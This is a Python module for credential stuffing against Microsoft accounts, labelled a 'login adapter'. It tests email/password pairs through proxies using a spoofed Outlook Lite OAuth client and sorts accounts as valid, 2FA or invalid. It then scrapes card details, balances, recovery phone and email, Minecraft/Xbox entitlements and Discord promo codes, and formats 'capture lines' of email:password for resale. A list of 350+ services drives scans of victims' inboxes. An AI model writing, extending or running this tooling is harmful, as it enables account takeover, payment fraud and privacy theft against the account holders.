"""
Microsoft Login Adapter
Uses OAuth2 authorization code flow from scanner_engine.
Clean, reliable login for all MS account operations.
"""
import re, requests, uuid, logging, concurrent.futures
from typing import Optional, Dict
from urllib.parse import urlparse, parse_qs

logger = logging.getLogger(__name__)

USER_AGENT = "Mozilla/5.0 (Linux; Android 9; SM-G975N) AppleWebKit/537.36"


def ms_login_full(email: str, password: str, session=None, proxy_fn=None, timeout: int = 18) -> str:
    """
    Login using OAuth2 authorization code flow.
    Returns: access_token string | '2FA' | 'None' | 'ERROR'
    """
    _session = session or requests.Session()
    if session is None:
        _session.headers['User-Agent'] = USER_AGENT
        # Apply proxy if provided
        if proxy_fn:
            try:
                p = proxy_fn()
                if p and isinstance(p, dict):
                    _session.proxies = p
            except Exception:
                pass

    try:
        # Step 1: Verify it's a Microsoft account
        r1 = _session.get(
            f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}",
            headers={"X-OneAuth-AppName": "Outlook Lite", "X-CorrelationId": str(uuid.uuid4())},
            timeout=timeout
        )
        txt1 = r1.text
        if "MSAccount" not in txt1:
            return 'None'

        # Step 2: Get login page with fresh PPFT
        r2 = _session.get(
            f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
            f"?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code"
            f"&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
            f"&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            f"&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D",
            allow_redirects=True, timeout=timeout
        )

        url_post = re.search(r'urlPost":"([^"]+)"', r2.text)

        # PPFT is now in JSON config as "sFT" on microsoftonline pages
        _t = r2.text
        _p1 = re.search(r'"sFT"\s*:\s*"([^"]{20,})"', _t)
        _p2 = re.search(r'name="PPFT"[^>]*value="([^"]+)"', _t) if not _p1 else None
        _p3 = re.search(r'value="([A-Za-z0-9+/=!*_-]{40,})"', _t) if not _p1 and not _p2 else None
        ppft = _p1 or _p2 or _p3

        if not url_post or not ppft:
            return 'ERROR'

        post_url = url_post.group(1).replace("\\/", "/")

        # Step 3: Submit credentials (no redirects — get auth code from Location)
        r3 = _session.post(
            post_url,
            data={
                "i13": "1", "login": email, "loginfmt": email,
                "type": "11", "LoginOptions": "1", "passwd": password,
                "PPFT": ppft.group(1), "PPSX": "PassportR",
                "NewUser": "1", "FoundMSAs": "", "i19": "9960"
            },
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            },
            allow_redirects=False, timeout=timeout
        )

        r3_low = r3.text.lower()
        if any(w in r3_low for w in ["incorrect", "password is incorrect", "we could not find"]):
            return 'None'
        if any(w in r3_low for w in ["identity/confirm", "2fa", "verify", "consent", "proofup"]):
            return '2FA'

        # Step 4: Get auth code from Location header
        location = r3.headers.get("Location", "")
        if not location:
            return 'ERROR'

        code_match = re.search(r'code=([^&]+)', location)
        if not code_match:
            return 'ERROR'

        # Step 5: Exchange auth code for access token
        r4 = _session.post(
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
            data={
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                "grant_type": "authorization_code",
                "code": code_match.group(1),
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
            },
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=timeout
        )

        if r4.status_code != 200 or "access_token" not in r4.text:
            return 'ERROR'

        token = r4.json().get("access_token", "")
        return token if token else 'ERROR'

    except requests.Timeout:
        return 'ERROR'
    except Exception as e:
        logger.debug(f"ms_login_full: {e}")
        return 'ERROR'


def ms_login_safe(email: str, password: str, session=None, proxy_fn=None, timeout: int = 18) -> str:
    """Hard-timeout wrapper."""
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=1) as ex:
            f = ex.submit(ms_login_full, email, password, session, proxy_fn, timeout)
            return f.result(timeout=timeout + 5)
    except concurrent.futures.TimeoutError:
        return 'ERROR'
    except Exception as e:
        logger.debug(f"ms_login_safe: {e}")
        return 'ERROR'


def ms_check_inbox(email: str, password: str, keywords=None, proxies: dict = None) -> dict:
    """OAuth2 code flow + 350 services inbox scan via scanner_engine."""
    try:
        from checkers.scanner_engine import HotmailChecker
        checker = HotmailChecker()
        if proxies:
            checker_session = requests.Session()
            checker_session.proxies = proxies
            checker_session.headers['User-Agent'] = USER_AGENT
            checker.session = checker_session
        result = checker.check_account(email, password, keywords)
        return result
    except Exception as e:
        return {'status': 'ERROR', 'reason': str(e)[:50]}


# ── Utility functions ─────────────────────────────────────────────────────────

_FMT = [(1_000_000_000.,'B',2),(1_000_000.,'M',2),(1_000.,'K',1)]
def _fmt_num(num) -> str:
    try: num = float(num)
    except: return '0'
    if num < 0: return '0'
    for t,s,p in _FMT:
        if num >= t: return f'{num/t:.{p}f}{s}'
    return str(int(num))


def check_payment_full(session, timeout: int = 15) -> Dict:
    result = {'cards':[],'address':None,'subscriptions':[],
              'balance':None,'paypal':None,'full_name':None,'date_registered':None}
    try:
        r = session.get(
            'https://login.live.com/oauth20_authorize.srf'
            '?client_id=000000000004773A&response_type=token'
            '&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete'
            '&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth'
            '&prompt=none',
            headers={'Referer':'https://account.microsoft.com/'}, timeout=timeout)
        token = parse_qs(urlparse(getattr(r,'url','')).fragment).get('access_token',[''])[0]
        if not token: return result
        hdrs = {'Authorization':f'MSADELEGATE1.0={token}','Accept':'application/json',
                'Content-Type':'application/json','Origin':'https://account.microsoft.com'}
        r2 = session.get(
            'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx'
            '?status=active,removed&language=en-GB',
            headers=hdrs, timeout=timeout)
        txt = getattr(r2,'text','')
        def lr(src, s, e, d=None):
            try: return src.split(s)[1].split(e)[0]
            except: return d
        result['date_registered'] = lr(txt,'"creationDateTime":"','T')
        result['full_name']       = lr(txt,'"accountHolderName":"','"')
        brand = lr(txt,'paymentMethodFamily":"credit_card","display":{"name":"','"','')
        last4 = lr(txt,'lastFourDigits":"','",','')
        em    = lr(txt,'expiryMonth":"','",','')
        ey    = lr(txt,'expiryYear":"','",','')
        bal   = lr(txt,'balance":',',',None)
        if brand or last4:
            result['cards'].append({'brand':brand,'last4':last4,'exp':f'{em}/{ey}',
                                    'display':f'{brand} ***{last4} {em}/{ey}'})
        if bal: result['balance'] = bal.strip()
    except Exception as e:
        logger.debug(f"check_payment_full: {e}")
    return result


def get_account_country(session, timeout=10) -> Optional[str]:
    try:
        r = session.get('https://account.microsoft.com/profile/api/CountryAndLanguage', timeout=timeout)
        if hasattr(r,'json') and r.status_code == 200:
            d = r.json()
            return d.get('country') or d.get('countryCode')
    except Exception: pass
    return None


def get_security_info(session, timeout=10) -> Dict:
    result = {'phone':None,'backup_email':None,'sfa':False}
    try:
        r = session.get('https://account.live.com/proofs/Manage/additional', timeout=timeout)
        if hasattr(r,'text') and r.status_code == 200:
            phones = re.findall(r'(?:phone|mobile)[^>]*>([+\d\s\-()\u202c]{8,20})', r.text, re.I)
            emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', r.text)
            if phones: result['phone'] = phones[0].strip()
            if len(emails) > 1: result['backup_email'] = emails[1]
            result['sfa'] = not result['phone']
    except Exception: pass
    return result


def check_ban(mc_token: str, username: str, session, timeout=10) -> str:
    if not mc_token: return '[Unknown]'
    try:
        r = session.get('https://api.minecraftservices.com/privacy/blocklist',
                        headers={'Authorization':f'Bearer {mc_token}'}, timeout=timeout)
        if hasattr(r,'json') and r.status_code == 200:
            return 'Banned' if r.json().get('blockedProfiles') else 'False'
    except Exception: pass
    return '[Unknown]'


def check_full_access(mc_token: str, session, timeout=10) -> Optional[str]:
    if not mc_token: return None
    try:
        r = session.get('https://api.minecraftservices.com/entitlements/license',
                        headers={'Authorization':f'Bearer {mc_token}'}, timeout=timeout)
        if hasattr(r,'json') and r.status_code == 200:
            names = [i.get('name','') for i in r.json().get('items',[])]
            if 'game_minecraft' in names: return 'Normal Minecraft'
            if any('gamepass' in n.lower() for n in names): return 'Xbox Game Pass'
    except Exception: pass
    return None


def check_optifine(username: str, session, timeout=5) -> bool:
    try:
        r = session.head(f'http://s.optifine.net/capes/{username}.png', timeout=timeout)
        return getattr(r,'status_code',0) == 200
    except Exception: return False


def check_namechange(mc_token: str, session, timeout=8) -> bool:
    try:
        r = session.get('https://api.minecraftservices.com/minecraft/profile/namechange',
                        headers={'Authorization':f'Bearer {mc_token}'}, timeout=timeout)
        if hasattr(r,'json') and r.status_code == 200:
            return r.json().get('nameChangeAllowed', False)
    except Exception: pass
    return False


def check_donut_smp(mc_token: str, uuid: str, username: str, session, timeout=8) -> Dict:
    result = {'has_donut':False,'rank':None,'joined':None}
    if not uuid and not username: return result
    try:
        r = session.get(f'https://api.donutsmp.net/v1/whitelist/{uuid or username}', timeout=timeout)
        if hasattr(r,'json') and r.status_code == 200:
            d = r.json()
            result.update({'has_donut':d.get('whitelisted',False),
                           'rank':d.get('rank'),'joined':d.get('joinDate')})
    except Exception: pass
    return result


def fetch_discord_promos(session, access_token: str, timeout=8) -> Dict:
    result = {'has_promo':False,'promos':[]}
    if not access_token: return result
    try:
        r = session.get('https://discordapp.com/api/v9/users/@me/outbound-promotions/codes',
                        headers={'Authorization':f'Bearer {access_token}'}, timeout=timeout)
        if hasattr(r,'json') and r.status_code == 200:
            codes = r.json()
            if codes:
                result = {'has_promo':True,'promos':[c.get('code') for c in codes if c.get('code')]}
    except Exception: pass
    return result


def claim_buddy_pass(session, timeout=10) -> Dict:
    result = {'has_buddy_pass':False,'claim_url':None}
    try:
        r = session.get('https://www.xbox.com/en-US/live/gold/buddypass', timeout=timeout)
        if hasattr(r,'text') and r.status_code == 200:
            if any(w in r.text.lower() for w in ('invite','buddy','gift','share')):
                result = {'has_buddy_pass':True,'claim_url':'https://www.xbox.com/en-US/live/gold/buddypass'}
    except Exception: pass
    return result


def build_capture_line(email, password, username='N/A', capes='',
                       acc_type='', banned=None, hypixel=None,
                       optifine=False, namechange=False, sfa=False) -> str:
    if banned is None or str(banned) in ('[Unknown]','[Error]','[Unchecked]'):
        ban = '[Unknown]'
    elif banned and str(banned) != 'False':
        ban = '[Banned]'
    else:
        ban = '[Unbanned]'

    tags = []
    at = str(acc_type).upper()
    if 'ULTIMATE' in at or 'XGPU' in at: tags.append('[XGPU]')
    elif 'GAME PASS' in at or 'XGP' in at: tags.append('[XGP]')
    if 'MINECRAFT' in at or 'NORMAL' in at: tags.append('[MC]')
    if sfa: tags.append('[SFA]')
    if capes and capes.strip(): tags.append(f'[{capes}]')
    if optifine: tags.append('[Optifine]')
    if namechange: tags.append('[NameChange]')

    hyp = ''
    if hypixel and hypixel.get('level'):
        try:
            lvl = float(str(hypixel['level']).replace(',',''))
            if lvl > 0: hyp = f'[Lvl:{int(lvl)}]'
        except Exception: pass

    display  = username if username and username != 'N/A' else 'NoMC'
    tags_str = ''.join(tags)
    line     = f'[{display}] {ban} {tags_str}{hyp} {email}:{password}'

    if hypixel:
        hp = []
        if hypixel.get('bw_stars'): hp.append(f"BW:{hypixel['bw_stars']}")
        if hypixel.get('sw_stars'): hp.append(f"SW:{hypixel['sw_stars']}")
        if hypixel.get('sb_coins'): hp.append(f"Coins:{hypixel['sb_coins']}")
        if hp: line += f' [Hypixel: {", ".join(hp)}]'
    return line


# ═══════════════════════════════════════════════════════════════
# 350+ SERVICES DATABASE — for inbox scanning
# ═══════════════════════════════════════════════════════════════

SERVICES_ALL = {
    # ═══ SOCIAL MEDIA (40) ═══
    "Facebook": ["facebookmail.com", "facebook.com"],
    "Instagram": ["mail.instagram.com", "instagram.com"],
    "TikTok": ["account.tiktok.com", "tiktok.com"],
    "Twitter/X": ["x.com", "twitter.com"],
    "LinkedIn": ["linkedin.com"],
    "Snapchat": ["snapchat.com"],
    "Discord": ["discord.com"],
    "Telegram": ["telegram.org"],
    "WhatsApp": ["whatsapp.com"],
    "Pinterest": ["pinterest.com"],
    "Reddit": ["reddit.com"],
    "Tumblr": ["tumblr.com"],
    "WeChat": ["wechat.com"],
    "Line": ["line.me"],
    "Viber": ["viber.com"],
    "Kik": ["kik.com"],
    "Skype": ["skype.com"],
    "Zoom": ["zoom.us"],
    "Microsoft Teams": ["teams.microsoft.com"],
    "Slack": ["slack.com"],
    "Mastodon": ["mastodon.social"],
    "Threads": ["threads.net"],
    "BeReal": ["bereal.com"],
    "Clubhouse": ["clubhouse.com"],
    "Twitch": ["twitch.tv"],
    "YouTube": ["youtube.com"],
    "Vimeo": ["vimeo.com"],
    "Dailymotion": ["dailymotion.com"],
    "Quora": ["quora.com"],
    "Medium": ["medium.com"],
    "Substack": ["substack.com"],
    "Patreon": ["patreon.com"],
    "Ko-fi": ["ko-fi.com"],
    "OnlyFans": ["onlyfans.com"],
    "Fanhouse": ["fanhouse.app"],
    "Meetup": ["meetup.com"],
    "Nextdoor": ["nextdoor.com"],
    "Yelp": ["yelp.com"],
    "Foursquare": ["foursquare.com"],
    "9GAG": ["9gag.com"],
    
    # ═══ GAMING (60) ═══
    "Steam": ["steampowered.com", "steam.com"],
    "Xbox": ["xbox.com"],
    "PlayStation": ["playstation.com"],
    "Nintendo": ["nintendo.net"],
    "Epic Games": ["epicgames.com"],
    "EA Sports": ["ea.com"],
    "Ubisoft": ["ubisoft.com"],
    "Activision": ["activision.com"],
    "Blizzard": ["blizzard.com"],
    "Riot Games": ["riotgames.com"],
    "Roblox": ["roblox.com"],
    "Minecraft": ["mojang.com", "minecraft.net"],
    "Fortnite": ["epicgames.com"],
    "Valorant": ["riotgames.com"],
    "League of Legends": ["leagueoflegends.com"],
    "Apex Legends": ["ea.com"],
    "Call of Duty": ["callofduty.com"],
    "PUBG": ["pubg.com", "pubgmobile.com"],
    "Free Fire": ["freefire.com", "garena.com"],
    "Genshin Impact": ["hoyoverse.com", "genshinimpact.com"],
    "Honkai Star Rail": ["hoyoverse.com"],
    "Mobile Legends": ["moonton.com"],
    "Clash of Clans": ["clashofclans.com"],
    "Clash Royale": ["clashroyale.com"],
    "Brawl Stars": ["brawlstars.com"],
    "Among Us": ["innersloth.com"],
    "Fall Guys": ["epicgames.com"],
    "Rocket League": ["epicgames.com"],
    "FIFA": ["ea.com"],
    "Madden NFL": ["ea.com"],
    "NBA 2K": ["2k.com"],
    "GTA V": ["rockstargames.com"],
    "Red Dead": ["rockstargames.com"],
    "The Sims": ["ea.com"],
    "Battlefield": ["ea.com"],
    "Overwatch": ["blizzard.com"],
    "World of Warcraft": ["blizzard.com"],
    "Hearthstone": ["blizzard.com"],
    "Diablo": ["blizzard.com"],
    "Destiny": ["bungie.net"],
    "Halo": ["xbox.com"],
    "Counter-Strike": ["steampowered.com"],
    "Dota 2": ["steampowered.com"],
    "Rainbow Six": ["ubisoft.com"],
    "Assassin's Creed": ["ubisoft.com"],
    "Far Cry": ["ubisoft.com"],
    "Watch Dogs": ["ubisoft.com"],
    "Warframe": ["warframe.com"],
    "Paladins": ["hirezstudios.com"],
    "Smite": ["hirezstudios.com"],
    "Rogue Company": ["hirezstudios.com"],
    "War Thunder": ["gaijin.net"],
    "World of Tanks": ["wargaming.net"],
    "Crossfire": ["z8games.com"],
    "Garena": ["garena.com"],
    "Cookie Run": ["devsisters.com"],
    "Candy Crush": ["king.com"],
    "Pokémon GO": ["nianticlabs.com"],
    "RAID Shadow": ["plarium.com"],
    "AFK Arena": ["lilithgames.com"],
    "Supercell": ["supercell.com"],
    "Midasbuy": ["midasbuy.com"],
    
    # ═══ STREAMING (35) ═══
    "Netflix": ["account.netflix.com", "netflix.com"],
    "Spotify": ["spotify.com"],
    "Disney+": ["disneyplus.com"],
    "HBO Max": ["hbomax.com"],
    "Amazon Prime": ["primevideo.com"],
    "YouTube Premium": ["youtube.com"],
    "Apple TV+": ["apple.com"],
    "Apple Music": ["apple.com"],
    "Hulu": ["hulu.com"],
    "Paramount+": ["paramountplus.com"],
    "Peacock": ["peacocktv.com"],
    "Discovery+": ["discoveryplus.com"],
    "Crunchyroll": ["crunchyroll.com"],
    "Funimation": ["funimation.com"],
    "VRV": ["vrv.co"],
    "Tidal": ["tidal.com"],
    "Deezer": ["deezer.com"],
    "SoundCloud": ["soundcloud.com"],
    "Pandora": ["pandora.com"],
    "iHeartRadio": ["iheart.com"],
    "Audible": ["audible.com"],
    "Scribd": ["scribd.com"],
    "Kindle Unlimited": ["amazon.com"],
    "ESPN+": ["espn.com"],
    "DAZN": ["dazn.com"],
    "Showtime": ["showtime.com"],
    "Starz": ["starz.com"],
    "Cinemax": ["cinemax.com"],
    "Pluto TV": ["pluto.tv"],
    "Tubi": ["tubi.tv"],
    "Vudu": ["vudu.com"],
    "Plex": ["plex.tv"],
    "Emby": ["emby.media"],
    "Jellyfin": ["jellyfin.org"],
    "Kodi": ["kodi.tv"],
    
    # ═══ SHOPPING (40) ═══
    "Amazon": ["amazon.com"],
    "eBay": ["ebay.com"],
    "AliExpress": ["aliexpress.com"],
    "Walmart": ["walmart.com"],
    "Target": ["target.com"],
    "Best Buy": ["bestbuy.com"],
    "Newegg": ["newegg.com"],
    "Etsy": ["etsy.com"],
    "Wish": ["wish.com"],
    "Shein": ["shein.com"],
    "Temu": ["temu.com"],
    "Shopee": ["shopee.com"],
    "Lazada": ["lazada.com"],
    "Zalando": ["zalando.com"],
    "ASOS": ["asos.com"],
    "Nike": ["nike.com"],
    "Adidas": ["adidas.com"],
    "Zara": ["zara.com"],
    "H&M": ["hm.com"],
    "Uniqlo": ["uniqlo.com"],
    "Forever 21": ["forever21.com"],
    "Gap": ["gap.com"],
    "Old Navy": ["oldnavy.com"],
    "Macy's": ["macys.com"],
    "Nordstrom": ["nordstrom.com"],
    "Sephora": ["sephora.com"],
    "Ulta": ["ulta.com"],
    "Home Depot": ["homedepot.com"],
    "Lowe's": ["lowes.com"],
    "IKEA": ["ikea.com"],
    "Wayfair": ["wayfair.com"],
    "Overstock": ["overstock.com"],
    "Zappos": ["zappos.com"],
    "Foot Locker": ["footlocker.com"],
    "StockX": ["stockx.com"],
    "GOAT": ["goat.com"],
    "Farfetch": ["farfetch.com"],
    "Depop": ["depop.com"],
    "Poshmark": ["poshmark.com"],
    "Mercari": ["mercari.com"],
    
    # ═══ FINANCE & CRYPTO (30) ═══
    "PayPal": ["paypal.com"],
    "Venmo": ["venmo.com"],
    "Cash App": ["cash.app"],
    "Zelle": ["zellepay.com"],
    "Stripe": ["stripe.com"],
    "Square": ["square.com"],
    "Binance": ["binance.com"],
    "Coinbase": ["coinbase.com"],
    "Kraken": ["kraken.com"],
    "Crypto.com": ["crypto.com"],
    "KuCoin": ["kucoin.com"],
    "Bitfinex": ["bitfinex.com"],
    "Gemini": ["gemini.com"],
    "Bitstamp": ["bitstamp.net"],
    "OKX": ["okx.com"],
    "Bybit": ["bybit.com"],
    "Huobi": ["huobi.com"],
    "Revolut": ["revolut.com"],
    "Wise": ["wise.com"],
    "Skrill": ["skrill.com"],
    "Neteller": ["neteller.com"],
    "Payoneer": ["payoneer.com"],
    "WebMoney": ["webmoney.ru"],
    "Perfect Money": ["perfectmoney.is"],
    "Robinhood": ["robinhood.com"],
    "eToro": ["etoro.com"],
    "TD Ameritrade": ["tdameritrade.com"],
    "Fidelity": ["fidelity.com"],
    "Charles Schwab": ["schwab.com"],
    "Interactive Brokers": ["ibkr.com"],
    
    # ═══ AI PLATFORMS (25) ═══
    "ChatGPT": ["openai.com"],
    "OpenAI": ["openai.com"],
    "Claude AI": ["anthropic.com"],
    "Anthropic": ["anthropic.com"],
    "Google Gemini": ["google.com"],
    "Google Bard": ["google.com"],
    "Microsoft Copilot": ["microsoft.com"],
    "Bing AI": ["microsoft.com"],
    "Grok": ["x.ai"],
    "Perplexity AI": ["perplexity.ai"],
    "DeepSeek": ["deepseek.com"],
    "Poe": ["poe.com"],
    "Character.AI": ["character.ai"],
    "Replika": ["replika.ai"],
    "Jasper": ["jasper.ai"],
    "Copy.ai": ["copy.ai"],
    "Writesonic": ["writesonic.com"],
    "Notion AI": ["makenotion.com"],
    "Grammarly": ["grammarly.com"],
    "QuillBot": ["quillbot.com"],
    "Midjourney": ["midjourney.com"],
    "DALL-E": ["openai.com"],
    "Stable Diffusion": ["stability.ai"],
    "Runway": ["runwayml.com"],
    "ElevenLabs": ["elevenlabs.io"],
    
    # ═══ EDUCATION (20) ═══
    "Udemy": ["udemy.com"],
    "Coursera": ["coursera.org"],
    "edX": ["edx.org"],
    "Khan Academy": ["khanacademy.org"],
    "Skillshare": ["skillshare.com"],
    "LinkedIn Learning": ["linkedin.com"],
    "Pluralsight": ["pluralsight.com"],
    "DataCamp": ["datacamp.com"],
    "Codecademy": ["codecademy.com"],
    "Duolingo": ["duolingo.com"],
    "Babbel": ["babbel.com"],
    "Rosetta Stone": ["rosettastone.com"],
    "Memrise": ["memrise.com"],
    "Brilliant": ["brilliant.org"],
    "MasterClass": ["masterclass.com"],
    "Domestika": ["domestika.org"],
    "CreativeLive": ["creativelive.com"],
    "Udacity": ["udacity.com"],
    "FutureLearn": ["futurelearn.com"],
    "Great Courses Plus": ["thegreatcoursesplus.com"],
}


def ms_check_inbox(email: str, password: str, keywords: list = None, proxies: dict = None) -> dict:
    """
    OAuth2 authorization code flow — proper inbox access.
    Better than PPFT for inbox scanning. Uses code exchange for
    real Graph API access + scans for 350+ services in mailbox.
    """
    try:
        from checkers.scanner_engine import HotmailChecker
        checker = HotmailChecker()
        if proxies:
            import requests as _rq
            checker.session = _rq.Session()
            checker.session.proxies = proxies
        return checker.check_account(email, password, keywords)
    except ImportError:
        return {'status': 'ERROR', 'reason': 'scanner_engine not available'}
    except Exception as e:
        return {'status': 'ERROR', 'reason': str(e)[:50]}
